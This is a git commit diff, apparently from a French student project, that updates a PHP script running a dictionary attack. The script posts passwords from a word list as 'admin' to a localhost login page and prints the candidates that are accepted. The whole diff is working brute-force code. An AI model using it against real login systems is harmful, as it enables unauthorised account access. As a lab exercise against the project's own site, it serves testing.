b0152db90303759b2ea65770e41880a275bbc197
antomuz <85632778+antomuz@users.noreply.github.com>
2021-12-08 10:53:11 +0100

    mise a jour du fichier d'attaque par dico

--- Fichiers_sprint_10/attaque/attaqueDico/attaque.php
+++ Fichiers_sprint_10/attaque/attaqueDico/attaque.php
@@ -1,9 +1,10 @@
 <?php
 $objetRequete = curl_init();
-curl_setopt($objetRequete, CURLOPT_URL,'http://localhost/MERLET/Fichiers_sprint_12/index.php?vue=Connexion&action=Verification');
+curl_setopt($objetRequete, CURLOPT_URL,'http://localhost/Fichier_sprint/Fichiers_sprint_10/index.php?vue=Connexion&action=Verification');
 curl_setopt($objetRequete, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($objetRequete, CURLOPT_FOLLOWLOCATION, true);
-$fichier = fopen("C:\wamp64\www\MERLET\Fichiers_sprint_12\attaque\listeMDP.txt", "r");
+curl_setopt($objetRequete, CURLOPT_NOPROXY, '*');
+$fichier = fopen("C:\wamp64\www\Fichier_sprint\Fichiers_sprint_10\attaque\listeMDP.txt", "r");
 if ($fichier)
 {
     while (($motDePasseCourant = fgets($fichier)) !== false)
@@ -11,16 +12,16 @@ if ($fichier)
         $chaineParametre = 'role=1&login=admin&pwd='.rtrim($motDePasseCourant).'';
         curl_setopt($objetRequete, CURLOPT_POSTFIELDS, $chaineParametre);
         $response = curl_exec($objetRequete);
-        $redirectionURL = curl_getinfo($objetRequete, CURLINFO_EFFECTIVE_URL);
+        // $redirectionURL = curl_getinfo($objetRequete, CURLINFO_EFFECTIVE_URL);
 
         if(curl_error($objetRequete))
         {
             trigger_error('Curl Error' . curl_error($objetRequete));
         }
 
-        if(!strpos($redirectionURL, 'Erreur de connexion'))
+        if(!strpos($response, 'Erreur de connexion'))
         {
-            echo "mot de passe possible : ".rtrim($motDePasseCourant)." - ".$redirectionURL."\n";
+            echo "mot de passe possible : ".rtrim($motDePasseCourant)."\n";
         }
     }
 fclose(($fichier));
